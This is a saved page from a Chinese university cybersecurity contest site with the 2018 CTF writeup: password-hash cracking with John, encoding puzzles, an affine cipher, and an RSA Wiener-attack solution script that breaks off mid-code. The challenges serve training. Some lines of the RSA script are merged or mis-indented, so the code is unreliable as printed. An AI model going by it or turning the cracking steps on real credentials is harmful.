<!DOCTYPE html>
<!-- saved from url=(0058)http://www.sdnisc.cn/detail.asp?ids=262&idss=275&idsss=747 -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<title>历届比赛-山东省大学生网络安全技能大赛</title>
<meta name="Keywords" content="山东省大学生网络安全技能大赛">
<meta name="Description" content="山东省大学生网络安全技能大赛">
<link href="./历届比赛-山东省大学生网络安全技能大赛_files/style.css" rel="stylesheet" type="text/css">
<script type="text/javascript" src="./历届比赛-山东省大学生网络安全技能大赛_files/jquery-1.7.2.js"></script><style type="text/css"></style>
<script type="text/javascript" src="./历届比赛-山东省大学生网络安全技能大赛_files/jquery.SuperSlide.js"></script>
</head>

<body>

 
<div class="upper">
  <div class="upper-width">
 <div class="upper-width-left">欢迎来到山东省大学生网络安全技能大赛！</div>
 <div class="upper-width-right"><a href="http://www.sdnisc.cn/">首页</a> | <a href="http://www.sdnisc.cn/present_294_295.html">联系我们</a></div>
 </div>
</div>
<div class="logo-wrap">
  <div class="logo"><a href="http://www.sdnisc.cn/"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/logo.png"></a></div>
</div>
<div class="nav">
  <ul>
    <li><a href="http://www.sdnisc.cn/">首页</a></li>
    <li><a href="http://www.sdnisc.cn/present_261_268.html">赛事介绍</a></li>
    <li><a style="background:#014dad" href="http://www.sdnisc.cn/match_262_275.html">历届比赛</a></li>
    <li><a href="http://www.sdnisc.cn/school_263_276.html">优秀院校</a></li>
    <li><a href="http://www.sdnisc.cn/forum_264_277.html">赛事平台</a></li>
    <li><a href="http://www.sdnisc.cn/special.html">本届专题</a></li>
    <!--<li><a  href="talk_266_281.html">参赛交流</a></li>-->
    <!--<li><a  href="talk2.html">参赛交流</a></li>-->
    <li><a href="http://www.sdnisc.cn/yuandi_274_282.html">学习园地</a></li>
  </ul>
</div>
<div class="site"><a href="http://www.sdnisc.cn/">首页</a> &gt; <a href="http://www.sdnisc.cn/detail.asp?ids=262&amp;idss=275">历届比赛</a> </div>
<div class="content">



  <div class="content-left">
  

  
    <div class="content-left-head" style="width:1100px;">
    <h4 style="width:1100px;">第七届山东省大学生网络安全技能大赛Writeup</h4>
    <div style="width:1100px;">发布人：admin   发布时间：2018-11-7  浏览数：3640</div>
     </div>
     
    <div class="content-left-detail2">
    <h1 id="toc_0" style="white-space: normal; box-sizing: border-box; font-size: 2.25em; margin-right: 0px; margin-bottom: 16px; margin-left: 0px; line-height: 1.2; position: relative; padding-bottom: 0.3em; border-bottom: 1px solid rgb(238, 238, 238); caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto; text-align: center; margin-top: 0px !important;">第七届山东省大学生网络安全技能大赛Writeup</h1><style type="text/css">p.p1 {margin: 0.0px 0.0px 0.0px 0.0px; line-height: 19.0px; font: 13.0px 'Helvetica Neue'; color: #000000}
span.s1 {color: #00a2ff}</style><p class="p1">本次大赛，组委会提供答题平台、题目、复现地址，可查看：<a href="http://47.105.148.65:4000/"><span class="s1">http://47.105.148.65:4000</span></a></p><h2 id="toc_1" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.225; font-size: 1.75em; position: relative; padding-bottom: 0.3em; border-bottom: 1px solid rgb(238, 238, 238); caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">Misc - 3</h2><h3 id="toc_2" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.43; font-size: 1.5em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">1.Crack it</h3><h4 id="toc_3" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">题目描述</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">破解该文件，获得密码，flag格式为：<code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">flag{*******}</code></p><h4 id="toc_4" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">考点</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">shadow文件破解</p><h4 id="toc_5" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">解题过程</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">kali下，无需加载字典，john直接破解即可。</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415755281973493.png" title="image.png" alt="image.png" width="504" height="84" style="width: 504px; height: 84px;"></p><h3 id="toc_6" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.43; font-size: 1.5em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">2.进制转换</h3><h4 id="toc_7" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">题目描述</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">二进制、八进制、十进制、十六进制，你能分的清吗？</p><h4 id="toc_8" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">考点</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">编程基础、进制转换</p><h4 id="toc_9" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">解题过程</h4><pre style="margin-top: 0px; margin-bottom: 16px; padding: 16px; border-radius: 3px; background-color: rgb(247, 247, 247); box-sizing: border-box; overflow: auto; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: 1.45; overflow-wrap: normal; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); text-size-adjust: auto;">import&nbsp;binascii

text&nbsp;=&nbsp;"d87&nbsp;x65&nbsp;x6c&nbsp;x63&nbsp;o157&nbsp;d109&nbsp;o145&nbsp;b100000&nbsp;d116&nbsp;b1101111&nbsp;o40&nbsp;x6b&nbsp;b1100101&nbsp;b1101100&nbsp;o141&nbsp;d105&nbsp;x62&nbsp;d101&nbsp;b1101001&nbsp;d46&nbsp;o40&nbsp;d71&nbsp;x69&nbsp;d118&nbsp;x65&nbsp;x20&nbsp;b1111001&nbsp;o157&nbsp;b1110101&nbsp;d32&nbsp;o141&nbsp;d32&nbsp;d102&nbsp;o154&nbsp;x61&nbsp;x67&nbsp;b100000&nbsp;o141&nbsp;d115&nbsp;b100000&nbsp;b1100001&nbsp;d32&nbsp;x67&nbsp;o151&nbsp;x66&nbsp;d116&nbsp;b101110&nbsp;b100000&nbsp;d32&nbsp;d102&nbsp;d108&nbsp;d97&nbsp;o147&nbsp;d123&nbsp;x31&nbsp;b1100101&nbsp;b110100&nbsp;d98&nbsp;d102&nbsp;b111000&nbsp;d49&nbsp;b1100001&nbsp;d54&nbsp;b110011&nbsp;x39&nbsp;o64&nbsp;o144&nbsp;o145&nbsp;d53&nbsp;x61&nbsp;b1100010&nbsp;b1100011&nbsp;o60&nbsp;d48&nbsp;o65&nbsp;b1100001&nbsp;x63&nbsp;b110110&nbsp;d101&nbsp;o63&nbsp;b111001&nbsp;d97&nbsp;d51&nbsp;o70&nbsp;d55&nbsp;b1100010&nbsp;d125&nbsp;x20&nbsp;b101110&nbsp;x20&nbsp;b1001000&nbsp;d97&nbsp;d118&nbsp;o145&nbsp;x20&nbsp;d97&nbsp;o40&nbsp;d103&nbsp;d111&nbsp;d111&nbsp;x64&nbsp;d32&nbsp;o164&nbsp;b1101001&nbsp;x6d&nbsp;o145&nbsp;x7e"
solution&nbsp;=&nbsp;''
text2&nbsp;=&nbsp;text.split('&nbsp;')
for&nbsp;x&nbsp;in&nbsp;text2:
&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;x
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;x[0]&nbsp;==&nbsp;'b':&nbsp;#binary
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;solution&nbsp;+=&nbsp;chr(int(x[1:],2))&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;elif&nbsp;x[0]&nbsp;==&nbsp;'x':&nbsp;#&nbsp;hexadecimal
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;solution&nbsp;+=&nbsp;x[1:].decode("hex")&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;elif&nbsp;x[0]&nbsp;==&nbsp;'d':&nbsp;#&nbsp;decimal
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;solution&nbsp;+=&nbsp;chr(int(x[1:]))&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;elif&nbsp;x[0]&nbsp;==&nbsp;'o':&nbsp;#&nbsp;octal
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;solution&nbsp;+=&nbsp;chr(int(x[1:],8))
print&nbsp;solution</pre><h3 id="toc_10" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.43; font-size: 1.5em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">3.basic</h3><h4 id="toc_11" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">题目描述</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">黑，白，黑白，黑黑白白。</p><h4 id="toc_12" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">考点</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">python像素点写图片</p><h4 id="toc_13" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">解题过程</h4><pre style="margin-top: 0px; margin-bottom: 16px; padding: 16px; border-radius: 3px; background-color: rgb(247, 247, 247); box-sizing: border-box; overflow: auto; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: 1.45; overflow-wrap: normal; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); text-size-adjust: auto;">from&nbsp;PIL&nbsp;import&nbsp;Image

x&nbsp;=&nbsp;150
y&nbsp;=&nbsp;900

im&nbsp;=&nbsp;Image.new("RGB",&nbsp;(x,&nbsp;y))
file&nbsp;=&nbsp;open('basic.txt')

for&nbsp;i&nbsp;in&nbsp;range(0,&nbsp;x):
&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;j&nbsp;in&nbsp;range(0,&nbsp;y):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;line&nbsp;=&nbsp;file.readline().replace('(','').replace(')','')&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rgb&nbsp;=&nbsp;line.split(",")
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;im.putpixel((i,&nbsp;j),&nbsp;(int(rgb[0]),&nbsp;int(rgb[1]),&nbsp;int(rgb[2])))

im.show()</pre><h2 id="toc_14" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.225; font-size: 1.75em; position: relative; padding-bottom: 0.3em; border-bottom: 1px solid rgb(238, 238, 238); caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">Crypto - 3</h2><h3 id="toc_15" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.43; font-size: 1.5em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">1.affine</h3><h4 id="toc_16" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">题目描述</h4><pre style="margin-top: 0px; margin-bottom: 16px; padding: 16px; border-radius: 3px; background-color: rgb(247, 247, 247); box-sizing: border-box; overflow: auto; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: 1.45; overflow-wrap: normal; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); text-size-adjust: auto;">y&nbsp;=&nbsp;17*x-8&nbsp;flag{szzyfimhyzd}</pre><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">答案格式：<code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">flag{********}</code></p><h4 id="toc_17" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">考点</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">仿射加密</p><h4 id="toc_18" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">解题过程</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">仿射加密，直接解密即可。</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415756143381528.png" title="image.png" alt="image.png" width="602" height="332" style="width: 602px; height: 332px;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15411418527305.jpg" alt="" style="box-sizing: border-box; border: 0px; max-width: 100%;"></p><h3 id="toc_19" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.43; font-size: 1.5em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">2.rsa</h3><h4 id="toc_20" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">题目描述</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">请破解密文</p><h4 id="toc_21" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">考点</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">rsa wiener attack</p><h4 id="toc_22" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">解题过程</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">ne已经给出，可以看出e特别大，在e特别大的情况下，可以使用wiener attack的方法进行破解，正好工具RsaCtfTool集成了wiener attack的方法，所以可以直接使用RsaCtfTool计算私钥， 如下所示：<span class="Apple-converted-space">&nbsp;</span></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15411412050265.jpg" alt="" style="box-sizing: border-box; border: 0px; max-width: 100%;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415763011819547.png" title="image.png" alt="image.png" width="718" height="114" style="width: 718px; height: 114px;"></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415764842684858.png" title="image.png" alt="image.png" width="717" height="209" style="width: 717px; height: 209px;"></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">使用pqe直接解密密文，得到flag,代码如下所示:</p><pre style="margin-top: 0px; margin-bottom: 16px; padding: 16px; border-radius: 3px; background-color: rgb(247, 247, 247); box-sizing: border-box; overflow: auto; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: 1.45; overflow-wrap: normal; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); text-size-adjust: auto;">#coding:utf-8
from&nbsp;libnum&nbsp;
import&nbsp;n2s,s2nimport&nbsp;base64
def&nbsp;gcd(a,&nbsp;b):&nbsp;&nbsp;&nbsp;#求最大公约数
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;a&nbsp;&lt;&nbsp;b:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;a,&nbsp;b&nbsp;=&nbsp;b,&nbsp;a&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;b&nbsp;!=&nbsp;0:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;temp&nbsp;=&nbsp;a&nbsp;%&nbsp;b
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;a&nbsp;=&nbsp;b
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;b&nbsp;=&nbsp;temp&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;a
def&nbsp;egcd(a,&nbsp;b):
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;a&nbsp;==&nbsp;0:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;(b,&nbsp;0,&nbsp;1)&nbsp;&nbsp;&nbsp;&nbsp;
else:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;g,&nbsp;y,&nbsp;x&nbsp;=&nbsp;egcd(b&nbsp;%&nbsp;a,&nbsp;a)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;(g,&nbsp;x&nbsp;-&nbsp;(b&nbsp;//&nbsp;a)&nbsp;*&nbsp;y,&nbsp;y)
def&nbsp;modinv(a,&nbsp;m):
&nbsp;&nbsp;&nbsp;&nbsp;g,&nbsp;x,&nbsp;y&nbsp;=&nbsp;egcd(a,&nbsp;m)&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;g&nbsp;!=&nbsp;1:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;raise&nbsp;Exception('modular&nbsp;inverse&nbsp;does&nbsp;not&nbsp;exist')&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;else:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;x&nbsp;%&nbsp;mif&nbsp;__name__&nbsp;==&nbsp;"__main__":
&nbsp;&nbsp;&nbsp;&nbsp;p=15991846970993213322072626901560749932686325766403404864023341810735319249066370916090640926219079368845510444031400322229147771682961132420481897362843199
&nbsp;&nbsp;&nbsp;&nbsp;q=28805791771260259486856902729020438686670354441296247148207862836064657849735343618207098163901787287368569768472521344635567334299356760080507454640207003
&nbsp;&nbsp;&nbsp;&nbsp;e&nbsp;=&nbsp;354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;tmp&nbsp;=&nbsp;base64.b64decode("qzogS7X8M3ZOpkUhJJcbukaRduLyqHAPblmabaYSm9iatuulrHcEpBmil7V40N7gbsQXwYx5EBH5r5V2HRcEIOXjgfk5vpGLjPVxBLyXh2DajHPX6KvbFpQ8jNpCQbUNq8Hst00yDSO/6ri9dk6bk7+uyuN0b2K1bNG5St6sCQ4qYEA3xJbsHFvMqtvUdhMiqO7tNCUVTKZdN7iFvSJqK2IHosIf7FqO24zkHZpHi31sYU7pcgYEaGkVaKs8pjq6nbnffr4URfoexZHeQtq5UAkr95zD6WgvGcxaTDKafFntboX9GR9VUZnHePiio7nJ3msfue5rkIbISjmGCAlj+w==")
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;&nbsp;=&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;d&nbsp;=&nbsp;modinv(e,&nbsp;(p&nbsp;-&nbsp;1)&nbsp;*&nbsp;(q&nbsp;-&nbsp;1))&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;c=s2n(tmp)
&nbsp;&nbsp;&nbsp;&nbsp;c&nbsp;=&nbsp;38230991316229399651823567590692301060044620412191737764632384680546256228451518238842965221394711848337832459443844446889468362154188214840736744657885858943810177675871991111466653158257191139605699916347308294995664530280816850482740530602254559123759121106338359220242637775919026933563326069449424391192
&nbsp;&nbsp;&nbsp;&nbsp;#c&nbsp;=&nbsp;225031483444634056931067907865853799650197225351377050632290334721073031287701730297815850654473721939907812470206115171738967740183098960272963323728747481560137205796840356532306950935686580268408289864109695494835661414073083573249882362332920722000099781994315336570711188934565379141406727420346806389405536474102730682155998263607095718543239272202402139286809779368710600842078606046563228470023546348908618719147790859257980882643030144242048154566691808688844513142261099020381730517293884263384819159874220288293023868919557980548807831273449743064237407705987056818011286315950476959812697067649075359373253
&nbsp;&nbsp;&nbsp;&nbsp;n&nbsp;=&nbsp;p*q
